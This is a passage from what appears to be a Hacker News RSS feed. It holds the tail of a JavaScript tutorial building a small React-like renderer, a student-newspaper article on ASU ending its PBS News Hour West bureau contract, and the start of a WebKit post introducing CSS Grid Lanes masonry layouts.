Object</span><span>.</span><span>keys</span><span>(</span><span>prevProps</span><span>)</span></p></div><div><p><span>    </span><span>.</span><span>filter</span><span>(</span><span>isProperty</span><span>)</span></p></div><div><p><span>    </span><span>.</span><span>filter</span><span>(</span><span>isGone</span><span>(</span><span>prevProps</span><span>,</span><span> nextProps</span><span>)</span><span>)</span></p></div><div><p><span>    </span><span>.</span><span>forEach</span><span>(</span><span>name</span><span> </span><span>=&gt;</span><span> </span><span>{</span></p></div><div><p><span>      dom</span><span>[</span><span>name</span><span>]</span><span> </span><span>=</span><span> </span><span>""</span></p></div><div><p><span>    </span><span>}</span><span>)</span></p></div><div><p><span>​</span></p></div><div><p><span>  </span><span>// Set new or changed properties</span></p></div><div><p><span>  Object</span><span>.</span><span>keys</span><span>(</span><span>nextProps</span><span>)</span></p></div><div><p><span>    </span><span>.</span><span>filter</span><span>(</span><span>isProperty</span><span>)</span></p></div><div><p><span>    </span><span>.</span><span>filter</span><span>(</span><span>isNew</span><span>(</span><span>prevProps</span><span>,</span><span> nextProps</span><span>)</span><span>)</span></p></div><div><p><span>    </span><span>.</span><span>forEach</span><span>(</span><span>name</span><span> </span><span>=&gt;</span><span> </span><span>{</span></p></div><div><p><span>      dom</span><span>[</span><span>name</span><span>]</span><span> </span><span>=</span><span> nextProps</span><span>[</span><span>name</span><span>]</span></p></div><div><p><span>    </span><span>}</span><span>)</span></p></div><div><p><span>​</span></p></div><div><p><span>  </span><span>// Add event listeners</span></p></div><div><p><span>  Object</span><span>.</span><span>keys</span><span>(</span><span>nextProps</span><span>)</span></p></div><div><p><span>    </span><span>.</span><span>filter</span><span>(</span><span>isEvent</span><span>)</span></p></div><div><p><span>    </span><span>.</span><span>filter</span><span>(</span><span>isNew</span><span>(</span><span>prevProps</span><span>,</span><span> nextProps</span><span>)</span><span>)</span></p></div><div><p><span>    </span><span>.</span><span>forEach</span><span>(</span><span>name</span><span> </span><span>=&gt;</span><span> </span><span>{</span></p></div><div><p><span>      </span><span>const</span><span> eventType </span><span>=</span><span> name</span></p></div><div><p><span>        </span><span>.</span><span>toLowerCase</span><span>(</span><span>)</span></p></div><div><p><span>        </span><span>.</span><span>substring</span><span>(</span><span>2</span><span>)</span></p></div><div><p><span>      dom</span><span>.</span><span>addEventListener</span><span>(</span></p></div><div><p><span>        eventType</span><span>,</span></p></div><div><p><span>        nextProps</span><span>[</span><span>name</span><span>]</span></p></div><div><p><span>      </span><span>)</span></p></div><div><p><span>    </span><span>}</span><span>)</span></p></div><div><p><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>function</span><span> </span><span>commitRoot</span><span>(</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>  deletions</span><span>.</span><span>forEach</span><span>(</span><span>commitWork</span><span>)</span></p></div><div><p><span>  </span><span>commitWork</span><span>(</span><span>wipRoot</span><span>.</span><span>child</span><span>)</span></p></div><div><p><span>  currentRoot </span><span>=</span><span> wipRoot</span></p></div><div><p><span>  wipRoot </span><span>=</span><span> </span><span>null</span></p></div><div><p><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>function</span><span> </span><span>commitWork</span><span>(</span><span>fiber</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>  </span><span>if</span><span> </span><span>(</span><span>!</span><span>fiber</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>    </span><span>return</span></p></div><div><p><span>  </span><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>  </span><span>const</span><span> domParent </span><span>=</span><span> fiber</span><span>.</span><span>parent</span><span>.</span><span>dom</span></p></div><div><p><span>  </span><span>if</span><span> </span><span>(</span></p></div><div><p><span>    fiber</span><span>.</span><span>effectTag </span><span>===</span><span> </span><span>"PLACEMENT"</span><span> </span><span>&amp;&amp;</span></p></div><div><p><span>    fiber</span><span>.</span><span>dom </span><span>!=</span><span> </span><span>null</span></p></div><div><p><span>  </span><span>)</span><span> </span><span>{</span></p></div><div><p><span>    domParent</span><span>.</span><span>appendChild</span><span>(</span><span>fiber</span><span>.</span><span>dom</span><span>)</span></p></div><div><p><span>  </span><span>}</span><span> </span><span>else</span><span> </span><span>if</span><span> </span><span>(</span></p></div><div><p><span>    fiber</span><span>.</span><span>effectTag </span><span>===</span><span> </span><span>"UPDATE"</span><span> </span><span>&amp;&amp;</span></p></div><div><p><span>    fiber</span><span>.</span><span>dom </span><span>!=</span><span> </span><span>null</span></p></div><div><p><span>  </span><span>)</span><span> </span><span>{</span></p></div><div><p><span>    </span><span>updateDom</span><span>(</span></p></div><div><p><span>      fiber</span><span>.</span><span>dom</span><span>,</span></p></div><div><p><span>      fiber</span><span>.</span><span>alternate</span><span>.</span><span>props</span><span>,</span></p></div><div><p><span>      fiber</span><span>.</span><span>props</span></p></div><div><p><span>    </span><span>)</span></p></div><div><p><span>  </span><span>}</span><span> </span><span>else</span><span> </span><span>if</span><span> </span><span>(</span><span>fiber</span><span>.</span><span>effectTag </span><span>===</span><span> </span><span>"DELETION"</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>    domParent</span><span>.</span><span>removeChild</span><span>(</span><span>fiber</span><span>.</span><span>dom</span><span>)</span></p></div><div><p><span>  </span><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>  </span><span>commitWork</span><span>(</span><span>fiber</span><span>.</span><span>child</span><span>)</span></p></div><div><p><span>  </span><span>commitWork</span><span>(</span><span>fiber</span><span>.</span><span>sibling</span><span>)</span></p></div><div><p><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>function</span><span> </span><span>render</span><span>(</span><span>element</span><span>,</span><span> container</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>  wipRoot </span><span>=</span><span> </span><span>{</span></p></div><div><p><span>    </span><span>dom</span><span>:</span><span> container</span><span>,</span></p></div><div><p><span>    </span><span>props</span><span>:</span><span> </span><span>{</span></p></div><div><p><span>      </span><span>children</span><span>:</span><span> </span><span>[</span><span>element</span><span>]</span><span>,</span></p></div><div><p><span>    </span><span>}</span><span>,</span></p></div><div><p><span>    </span><span>alternate</span><span>:</span><span> currentRoot</span><span>,</span></p></div><div><p><span>  </span><span>}</span></p></div><div><p><span>  deletions </span><span>=</span><span> </span><span>[</span><span>]</span></p></div><div><p><span>  nextUnitOfWork </span><span>=</span><span> wipRoot</span></p></div><div><p><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>let</span><span> nextUnitOfWork </span><span>=</span><span> </span><span>null</span></p></div><div><p><span>let</span><span> currentRoot </span><span>=</span><span> </span><span>null</span></p></div><div><p><span>let</span><span> wipRoot </span><span>=</span><span> </span><span>null</span></p></div><div><p><span>let</span><span> deletions </span><span>=</span><span> </span><span>null</span></p></div><div><p><span>​</span></p></div><div><p><span>function</span><span> </span><span>workLoop</span><span>(</span><span>deadline</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>  </span><span>let</span><span> shouldYield </span><span>=</span><span> </span><span>false</span></p></div><div><p><span>  </span><span>while</span><span> </span><span>(</span><span>nextUnitOfWork </span><span>&amp;&amp;</span><span> </span><span>!</span><span>shouldYield</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>    nextUnitOfWork </span><span>=</span><span> </span><span>performUnitOfWork</span><span>(</span></p></div><div><p><span>      nextUnitOfWork</span></p></div><div><p><span>    </span><span>)</span></p></div><div><p><span>    shouldYield </span><span>=</span><span> deadline</span><span>.</span><span>timeRemaining</span><span>(</span><span>)</span><span> </span><span>&lt;</span><span> </span><span>1</span></p></div><div><p><span>  </span><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>  </span><span>if</span><span> </span><span>(</span><span>!</span><span>nextUnitOfWork </span><span>&amp;&amp;</span><span> wipRoot</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>    </span><span>commitRoot</span><span>(</span><span>)</span></p></div><div><p><span>  </span><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>  </span><span>requestIdleCallback</span><span>(</span><span>workLoop</span><span>)</span></p></div><div><p><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>requestIdleCallback</span><span>(</span><span>workLoop</span><span>)</span></p></div><div><p><span>​</span></p></div><div><p><span>function</span><span> </span><span>performUnitOfWork</span><span>(</span><span>fiber</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>  </span><span>if</span><span> </span><span>(</span><span>!</span><span>fiber</span><span>.</span><span>dom</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>    fiber</span><span>.</span><span>dom </span><span>=</span><span> </span><span>createDom</span><span>(</span><span>fiber</span><span>)</span></p></div><div><p><span>  </span><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>  </span><span>const</span><span> elements </span><span>=</span><span> fiber</span><span>.</span><span>props</span><span>.</span><span>children</span></p></div><div><p><span>  </span><span>reconcileChildren</span><span>(</span><span>fiber</span><span>,</span><span> elements</span><span>)</span></p></div><div><p><span>​</span></p></div><div><p><span>  </span><span>if</span><span> </span><span>(</span><span>fiber</span><span>.</span><span>child</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>    </span><span>return</span><span> fiber</span><span>.</span><span>child</span></p></div><div><p><span>  </span><span>}</span></p></div><div><p><span>  </span><span>let</span><span> nextFiber </span><span>=</span><span> fiber</span></p></div><div><p><span>  </span><span>while</span><span> </span><span>(</span><span>nextFiber</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>    </span><span>if</span><span> </span><span>(</span><span>nextFiber</span><span>.</span><span>sibling</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>      </span><span>return</span><span> nextFiber</span><span>.</span><span>sibling</span></p></div><div><p><span>    </span><span>}</span></p></div><div><p><span>    nextFiber </span><span>=</span><span> nextFiber</span><span>.</span><span>parent</span></p></div><div><p><span>  </span><span>}</span></p></div><div><p><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>function</span><span> </span><span>reconcileChildren</span><span>(</span><span>wipFiber</span><span>,</span><span> elements</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>  </span><span>let</span><span> index </span><span>=</span><span> </span><span>0</span></p></div><div><p><span>  </span><span>let</span><span> oldFiber </span><span>=</span></p></div><div><p><span>    wipFiber</span><span>.</span><span>alternate </span><span>&amp;&amp;</span><span> wipFiber</span><span>.</span><span>alternate</span><span>.</span><span>child</span></p></div><div><p><span>  </span><span>let</span><span> prevSibling </span><span>=</span><span> </span><span>null</span></p></div><div><p><span>​</span></p></div><div><p><span>  </span><span>while</span><span> </span><span>(</span></p></div><div><p><span>    index </span><span>&lt;</span><span> elements</span><span>.</span><span>length </span><span>||</span></p></div><div><p><span>    oldFiber </span><span>!=</span><span> </span><span>null</span></p></div><div><p><span>  </span><span>)</span><span> </span><span>{</span></p></div><div><p><span>    </span><span>const</span><span> element </span><span>=</span><span> elements</span><span>[</span><span>index</span><span>]</span></p></div><div><p><span>    </span><span>let</span><span> newFiber </span><span>=</span><span> </span><span>null</span></p></div><div><p><span>​</span></p></div><div><p><span>    </span><span>const</span><span> sameType </span><span>=</span></p></div><div><p><span>      oldFiber </span><span>&amp;&amp;</span></p></div><div><p><span>      element </span><span>&amp;&amp;</span></p></div><div><p><span>      element</span><span>.</span><span>type </span><span>==</span><span> oldFiber</span><span>.</span><span>type</span></p></div><div><p><span>​</span></p></div><div><p><span>    </span><span>if</span><span> </span><span>(</span><span>sameType</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>      newFiber </span><span>=</span><span> </span><span>{</span></p></div><div><p><span>        </span><span>type</span><span>:</span><span> oldFiber</span><span>.</span><span>type</span><span>,</span></p></div><div><p><span>        </span><span>props</span><span>:</span><span> element</span><span>.</span><span>props</span><span>,</span></p></div><div><p><span>        </span><span>dom</span><span>:</span><span> oldFiber</span><span>.</span><span>dom</span><span>,</span></p></div><div><p><span>        </span><span>parent</span><span>:</span><span> wipFiber</span><span>,</span></p></div><div><p><span>        </span><span>alternate</span><span>:</span><span> oldFiber</span><span>,</span></p></div><div><p><span>        </span><span>effectTag</span><span>:</span><span> </span><span>"UPDATE"</span><span>,</span></p></div><div><p><span>      </span><span>}</span></p></div><div><p><span>    </span><span>}</span></p></div><div><p><span>    </span><span>if</span><span> </span><span>(</span><span>element </span><span>&amp;&amp;</span><span> </span><span>!</span><span>sameType</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>      newFiber </span><span>=</span><span> </span><span>{</span></p></div><div><p><span>        </span><span>type</span><span>:</span><span> element</span><span>.</span><span>type</span><span>,</span></p></div><div><p><span>        </span><span>props</span><span>:</span><span> element</span><span>.</span><span>props</span><span>,</span></p></div><div><p><span>        </span><span>dom</span><span>:</span><span> </span><span>null</span><span>,</span></p></div><div><p><span>        </span><span>parent</span><span>:</span><span> wipFiber</span><span>,</span></p></div><div><p><span>        </span><span>alternate</span><span>:</span><span> </span><span>null</span><span>,</span></p></div><div><p><span>        </span><span>effectTag</span><span>:</span><span> </span><span>"PLACEMENT"</span><span>,</span></p></div><div><p><span>      </span><span>}</span></p></div><div><p><span>    </span><span>}</span></p></div><div><p><span>    </span><span>if</span><span> </span><span>(</span><span>oldFiber </span><span>&amp;&amp;</span><span> </span><span>!</span><span>sameType</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>      oldFiber</span><span>.</span><span>effectTag </span><span>=</span><span> </span><span>"DELETION"</span></p></div><div><p><span>      deletions</span><span>.</span><span>push</span><span>(</span><span>oldFiber</span><span>)</span></p></div><div><p><span>    </span><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>    </span><span>if</span><span> </span><span>(</span><span>oldFiber</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>      oldFiber </span><span>=</span><span> oldFiber</span><span>.</span><span>sibling</span></p></div><div><p><span>    </span><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>    </span><span>if</span><span> </span><span>(</span><span>index </span><span>===</span><span> </span><span>0</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>      wipFiber</span><span>.</span><span>child </span><span>=</span><span> newFiber</span></p></div><div><p><span>    </span><span>}</span><span> </span><span>else</span><span> </span><span>if</span><span> </span><span>(</span><span>element</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>      prevSibling</span><span>.</span><span>sibling </span><span>=</span><span> newFiber</span></p></div><div><p><span>    </span><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>    prevSibling </span><span>=</span><span> newFiber</span></p></div><div><p><span>    index</span><span>++</span></p></div><div><p><span>  </span><span>}</span></p></div><div><p><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>const</span><span> Didact </span><span>=</span><span> </span><span>{</span></p></div><div><p><span>  createElement</span><span>,</span></p></div><div><p><span>  render</span><span>,</span></p></div><div><p><span>}</span></p></div><div><p><span>​</span></p></div><div><p><span>/** @jsx Didact.createElement */</span></p></div><div><p><span>function</span><span> </span><span>App</span><span>(</span><span>props</span><span>)</span><span> </span><span>{</span></p></div><div><p><span>  </span><span>return</span><span> </span><span>&lt;</span><span>h1</span><span>&gt;</span><span>Hi </span><span>{</span><span>props</span><span>.</span><span>name</span><span>}</span><span>&lt;/</span><span>h1</span><span>&gt;</span></p></div><div><p><span>}</span></p></div><div><p><span>const</span><span> element </span><span>=</span><span> </span><span>&lt;</span><span>App</span><span> </span><span>name</span><span>=</span><span>"</span><span>foo</span><span>"</span><span> </span><span>/&gt;</span></p></div><div><p><span>const</span><span> container </span><span>=</span><span> document</span><span>.</span><span>getElementById</span><span>(</span><span>"root"</span><span>)</span></p></div><div><p><span>Didact</span><span>.</span><span>render</span><span>(</span><span>element</span><span>,</span><span> container</span><span>)</span></p></div></code></pre></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[PBS News Hour West to go dark after ASU discontinues contract (146 pts)]]></title>
            <link>https://www.statepress.com/article/2025/12/politics-pbs-newshour-west-closure</link>
            <guid>46332400</guid>
            <pubDate>Fri, 19 Dec 2025 23:59:53 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.statepress.com/article/2025/12/politics-pbs-newshour-west-closure">https://www.statepress.com/article/2025/12/politics-pbs-newshour-west-closure</a>, See on <a href="https://news.ycombinator.com/item?id=46332400">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
                        <div>

                                                            <p>ASU's Walter Cronkite School of Journalism and Mass Communication will not renew its contract with <a href="https://www.pbs.org/newshour/about/newshour-west" target="_blank">PBS News Hour West</a>, ending a reporting hub that covered the western U.S. and updated the nightly news produced on the East Coast for West Coast viewers.&nbsp;</p>
<p>Located on the Downtown Phoenix campus, the bureau offered internship opportunities for journalism students at the University.</p>
<p>The bureau was created to help the national News Hour program, which is broadcast by <a href="https://weta.org/" target="_blank">WETA</a>, "work more closely with PBS stations and other media partners on the West Coast," according to an <a href="https://cronkite.asu.edu/news/2019/pbs-newshour-announces-launch-of-pbs-newshour-west-at-asus-cronkite-school" target="_blank">ASU News</a> article announcing the launch of the bureau in 2019. More than 20% of News Hour's audience resides in that region.</p>
<p>News Hour West will make its last contribution to the national broadcast on Dec. 19.</p>

                                

                                <p>Michael Rancilio, the general manager of News Hour Productions and WETA's executive vice president and chief content officer, said in an email to PBS News supporters that the decision was "based on Arizona State University's revised priorities," according to <a href="https://current.org/2025/11/weta-to-cut-staff-cancel-pbs-news-weekend-and-close-news-hour-west-bureau/" target="_blank">Current</a>.</p>
<p><strong>READ MORE: </strong><a href="https://www.statepress.com/article/2025/06/politics-public-media-arizona-pbs-executive-order" target="_blank">Federal funding cuts to public media may impact Arizona PBS, students</a></p>
<p>A spokesperson for the University declined to comment on the closing, referring The State Press to PBS.&nbsp;</p>
<p>Both PBS News and Arizona PBS responded to the news of the closure but did not provide any reasoning for the choice.</p>
<p>"We are grateful to our partners at ASU and the Cronkite School on our effort to launch PBS News Hour West back in 2019 and the important journalism our small but nimble team there has been able to produce," PBS News' executive director of communications, Nick Massella, said in a written statement.</p>
<p>Jeremy Cauthen, the senior director of brand engagement and marketing at Arizona PBS, said in a written statement that the ASU-News Hour West partnership benefited audiences in the western U.S. as well as University students.</p>
<p>"Even though the station will no longer be providing production support for 'PBS News Hour', we'll continue our nightly broadcast of PBS' flagship news program and our ongoing commitment to keeping Arizonans informed through local news and public affairs programs like 'Arizona Horizon' and 'Horizonte,'" Cauthen said in a written statement.</p>
<p>AJ Ceglia, a senior studying journalism and mass communication, is one of the broadcast production interns at News Hour West. The internship was one of her first professional experiences, she said.</p>
<p>"I was just so relieved to find out that they were so willing to take the time to teach everything that we needed to know to produce the news at night," Ceglia said. "It's very upsetting to hear that it was shut down."</p>
<p>Ceglia said she was told that ASU made the decision, not PBS. She was only told that the contract was not being renewed and did not know any of the logistics of the closure.</p>

                                
                                                                                                    <p>The agreement between News Hour West and the University was mutually beneficial, Ceglia said. PBS got a headquarters in the West at a school with reliable broadcasting equipment, and the University's contributions were rewarded with heightened visibility.</p>
<p>An aerial shot of the Cronkite building is shown at the end of the nightly News Hour broadcast, crediting the school for its support.</p>
<p><iframe width="560" height="315" src="https://www.youtube.com/embed/458RXqTPebc?si=LgSOEDxIkaL5tMPd" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe></p>
<p>Ceglia said News Hour West staff members will lose their jobs because of the closure.</p>
                                
                                <p>"It's just upsetting that they really enjoyed being able to support the students that did the program, and they really liked being able to share so much experience," Ceglia said.</p>
<p>Ceglia said she sympathizes with the interns who were set to work at News Hour West for the spring semester because "they're having it basically ripped out of their hands." To fulfill the internship requirement to graduate with a journalism and mass communication degree, they must now find another way to gain those credits.</p>
<p>"It's not anything my producers can control, but what (the producers are) doing is they are really trying to put those soon-to-be interns to another place to work," Ceglia said. "That is something they're very focused on right now."</p>
<p>Current interns are still able to get the internship credit, Ceglia said. Nonetheless, the closure has had a personal impact on her.</p>
<p>"I feel so strongly about it because it really was a great opportunity to learn and one of my first real professional ones," Ceglia said. "I'm sad to see it go."</p>
<p><em>Edited by Carsten Oyer, Henry Smardo, Sophia Braccio and Pippa Fung.</em></p>
<hr>
<p>Reach the reporter at elbradfo@asu.edu and follow <a href="https://twitter.com/emmalbradford__" rel="noopener noreferrer" target="_blank">@emmalbradford__</a> on X.</p>
                                <p>Like <a href="https://www.facebook.com/StatePress/" rel="noopener noreferrer" target="_blank">The State Press</a> on Facebook and follow <a href="https://twitter.com/statepress" rel="noopener noreferrer" target="_blank">@statepress</a> on X.</p>

                            
                            <div>
                                    
            <hr>
        <div><p><strong>Emma Bradford</strong><span>Lead Politics Reporter</span>
</p></div>
<div>
<p>Emma Bradford is a junior studying journalism and mass communication and political science with a minor in business. She has previously worked at the Cronkite News Washington, D.C. bureau as a Politics and Money Reporter. Bradford is in her fourth semester with The State Press and on the politics desk.&nbsp;</p>
<ul><li><a href="mailto:elbradfo@asu.edu">elbradfo@asu.edu</a></li></ul>
</div>
    
                            </div>

                            <hr>

                            <div><p>
                                Continue supporting student journalism and </p><a href="https://www.asufoundation.org/arts-and-community/the-state-press-CA124731.html" target="_blank"><u>donate</u></a><p> to The State Press today.
                            </p></div>

                            

                            <hr>
                            
                        </div>
                    </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[CSS Grid Lanes (633 pts)]]></title>
            <link>https://webkit.org/blog/17660/introducing-css-grid-lanes/</link>
            <guid>46331586</guid>
            <pubDate>Fri, 19 Dec 2025 22:13:06 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://webkit.org/blog/17660/introducing-css-grid-lanes/">https://webkit.org/blog/17660/introducing-css-grid-lanes/</a>, See on <a href="https://news.ycombinator.com/item?id=46331586">Hacker News</a></p>
<div id="readability-page-1" class="page"><article id="post-17660">
            
            

            <div>
                                
                <p>It’s here, the future of masonry layouts on the web! After the groundwork laid by Mozilla, years of effort by Apple’s WebKit team, and many rounds debate at the CSS Working Group with all the browsers, it’s now clear how it works.</p>
<p>Introducing CSS Grid Lanes.</p>
<pre><code><span>.container</span> {
  <span>display</span>: <span>grid-lanes</span>;
  <span>grid-template-columns</span>: <span>repeat</span>(<span>auto-fill</span>, <span>minmax</span>(<span>250px</span>, <span>1</span><span>fr</span>));
  <span>gap</span>: <span>16px</span>;
}
</code></pre>
<p>Try it today in Safari Technology Preview 234.</p>
<h2>How Grid Lanes work</h2>
<p>Let’s break down exactly how to create this classic layout.</p>
<figure><picture><source srcset="https://webkit.org/wp-content/uploads/Grid-Lanes-classic-dark.png" type="image/png" media="(prefers-color-scheme: dark)"><img fetchpriority="high" decoding="async" src="https://webkit.org/wp-content/uploads/Grid-Lanes-classic-light.png" alt="Classic masonry-style layout of photos of various aspect ratios, all the same width, aligned in six columns" width="2000" height="1311" srcset="https://webkit.org/wp-content/uploads/Grid-Lanes-classic-light.png 2000w, https://webkit.org/wp-content/uploads/Grid-Lanes-classic-light-300x197.png 300w, https://webkit.org/wp-content/uploads/Grid-Lanes-classic-light-1024x671.png 1024w, https://webkit.org/wp-content/uploads/Grid-Lanes-classic-light-768x503.png 768w, https://webkit.org/wp-content/uploads/Grid-Lanes-classic-light-1536x1007.png 1536w" sizes="(max-width: 2000px) 100vw, 2000px"></picture><figcaption>You can try out this <a href="https://webkit.org/demos/grid3/photos/">demo of photo gallery layouts</a> today in Safari Technology Preview.</figcaption></figure>
<p>First, the HTML.</p>
<pre><code><span>&lt;<span>main</span> <span>class</span>=<span>"container"</span>&gt;</span>
  <span>&lt;<span>figure</span>&gt;</span><span>&lt;<span>img</span> <span>src</span>=<span>"photo-1.jpg"</span>&gt;</span><span>&lt;/<span>figure</span>&gt;</span>
  <span>&lt;<span>figure</span>&gt;</span><span>&lt;<span>img</span> <span>src</span>=<span>"photo-2.jpg"</span>&gt;</span><span>&lt;/<span>figure</span>&gt;</span>
  <span>&lt;<span>figure</span>&gt;</span><span>&lt;<span>img</span> <span>src</span>=<span>"photo-3.jpg"</span>&gt;</span><span>&lt;/<span>figure</span>&gt;</span>
  <span>&lt;!-- etc --&gt;</span>
<span>&lt;/<span>main</span>&gt;</span>
</code></pre>
<p>Let’s start by applying <code>display: grid-lanes</code> to the <code>main</code> element to create a Grid container ready to make this kind of layout. Then we use <code>grid-template-columns</code> to create the “lanes” with the full power of CSS Grid.</p>
<p>In this case, we’ll use <code>repeat(auto-fill, minmax(250px, 1fr))</code> to create flexible columns at least 250 pixels wide. The browser will decide how many columns to make, filling all available space.</p>
<p>And then, <code>gap: 16px</code> gives us 16 pixel gaps between the lanes, and 16 pixel gaps between items within the lanes.</p>
<pre><code><span>.container</span> {
  <span>display</span>: <span>grid-lanes</span>;
  <span>grid-template-columns</span>: <span>repeat</span>(<span>auto-fill</span>, <span>minmax</span>(<span>250px</span>, <span>1</span><span>fr</span>));
  <span>gap</span>: <span>16px</span>;
}
</code></pre>
<p>That’s it! In three lines of CSS, with zero media queries or container queries, we created a flexible layout that works on all screen sizes.</p>
<p>Think of it like a highway of cars in bumper-to-bumper traffic.</p>
<figure><img decoding="async" src="https://webkit.org/wp-content/uploads/Grid-Lanes-in-STP234.png" alt="Cartoon drawing of a highway from above. Nine cars fill four lanes of traffic, bumper to bumper. Each car has a number labeling it, showing the order these would be in HTML." width="1920" height="1080" srcset="https://webkit.org/wp-content/uploads/Grid-Lanes-in-STP234.png 1920w, https://webkit.org/wp-content/uploads/Grid-Lanes-in-STP234-300x169.png 300w, https://webkit.org/wp-content/uploads/Grid-Lanes-in-STP234-1024x576.png 1024w, https://webkit.org/wp-content/uploads/Grid-Lanes-in-STP234-768x432.png 768w, https://webkit.org/wp-content/uploads/Grid-Lanes-in-STP234-1536x864.png 1536w" sizes="(max-width: 1920px) 100vw, 1920px"></figure>
<p>Just like the classic <a href="https://masonry.desandro.com/">Masonry library</a>, as the browser decides where to put each item, the next one is placed in whichever column gets it closest to the top of the window. Like traffic, each car “changes lanes” to end up in the lane that gets them “the furthest ahead”.</p>
<p>This layout makes it possible for users to tab across the lanes to all currently-visible content, (not down the first column below the fold to the very bottom, and then back to the top of the second column). It also makes it possible for you to build a site that keeps loading more content as the user scrolls, infinitely, without needing JavaScript to handle the layout.</p>
<h2>The power of Grid</h2>
<h3>Varying lane sizes</h3>
<p>Because Grid Lanes uses the full power of CSS Grid to define lanes using <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Reference/Properties/grid-template-columns"><code>grid-template-*</code></a>, it’s easy to create creative design variations.</p>
<p>For example, we can create a flexible layout with alternating narrow and wide columns — where both the first and last columns are always narrow, even as the number of columns changes with the viewport size. This is accomplished with <code>grid-template-columns: repeat(auto-fill, minmax(8rem, 1fr) minmax(16rem, 2fr)) minmax(8rem, 1fr)</code>.</p>
<figure><picture><source srcset="https://webkit.org/wp-content/uploads/Grid-Lanes-varying-widths-dark.png" type="image/png" media="(prefers-color-scheme: dark)"><img decoding="async" src="https://webkit.org/wp-content/uploads/Grid-Lanes-varying-widths-light.png" alt="Demo layout of photos, where the 1st, 3rd, 5th, and 7th column are narrow, while the 2nd, 4th and 6th columns are twice as wide. " width="2000" height="1311" srcset="https://webkit.org/wp-content/uploads/Grid-Lanes-varying-widths-light.png 2000w, https://webkit.org/wp-content/uploads/Grid-Lanes-varying-widths-light-300x197.png 300w, https://webkit.org/wp-content/uploads/Grid-Lanes-varying-widths-light-1024x671.png 1024w, https://webkit.org/wp-content/uploads/Grid-Lanes-varying-widths-light-768x503.png 768w, https://webkit.org/wp-content/uploads/Grid-Lanes-varying-widths-light-1536x1007.png 1536w" sizes="(max-width: 2000px) 100vw, 2000px"></picture><figcaption>Try out the <a href="https://webkit.org/demos/grid3/photos/">demo of photo gallery layouts</a> today in Safari Technology Preview.</figcaption></figure>
<p>There’s a whole world of possibilities using <code>grid-template-*</code> syntax.</p>
<h4>Spanning items</h4>
<p>Since we have the full power of Grid layout, we can also span lanes, of course.</p>
<figure><picture><source srcset="https://webkit.org/wp-content/uploads/Grid-Lanes-newspaper-demo-dark.png" type="image/png" media="(prefers-color-scheme: dark)"><img loading="lazy" decoding="async" src="https://webkit.org/wp-content/uploads/Grid-Lanes-newspaper-demo-light.png" alt="A complex layout of titles with teaser text for over two dozen articles — telling people what they'll experience if they open the article. The first teaser has a very large headline with text, and spans four columns. Five more teasers are medium-sized, bowl and next to the hero. The rest of the space available is filled in with small teasers. None of the teasers have the same amount of content as the rest. The heights of each box are random, and the layout tucks each box up against the one above it." width="2000" height="1394" srcset="https://webkit.org/wp-content/uploads/Grid-Lanes-newspaper-demo-light.png 2000w, https://webkit.org/wp-content/uploads/Grid-Lanes-newspaper-demo-light-300x209.png 300w, https://webkit.org/wp-content/uploads/Grid-Lanes-newspaper-demo-light-1024x714.png 1024w, https://webkit.org/wp-content/uploads/Grid-Lanes-newspaper-demo-light-768x535.png 768w, https://webkit.org/wp-content/uploads/Grid-Lanes-newspaper-demo-light-1536x1071.png 1536w" sizes="auto, (max-width: 2000px) 100vw, 2000px"></picture><figcaption>Try out the <a href="https://webkit.org/demos/grid3/newspaper/">demo of newspaper article layout</a> today in Safari Technology Preview.</figcaption></figure>
<pre><code><span>main</span> {
  <span>display</span>: <span>grid-lanes</span>;
  <span>grid-template-columns</span>: <span>repeat</span>(<span>auto-fill</span>, <span>minmax</span>(<span>20</span><span>ch</span>, <span>1</span><span>fr</span>));
  <span>gap</span>: <span>2</span><span>lh</span>;
}
<span>article</span> { 
  <span>grid-column</span>: <span>span</span> <span>1</span>; 
}
<span>@media</span> (1250<span>px</span> &lt; <span>width</span>) {
  <span>article</span>:<span>nth-child</span>(<span>1</span>) { 
    <span>grid-column</span>: <span>span</span> <span>4</span>;             
  }
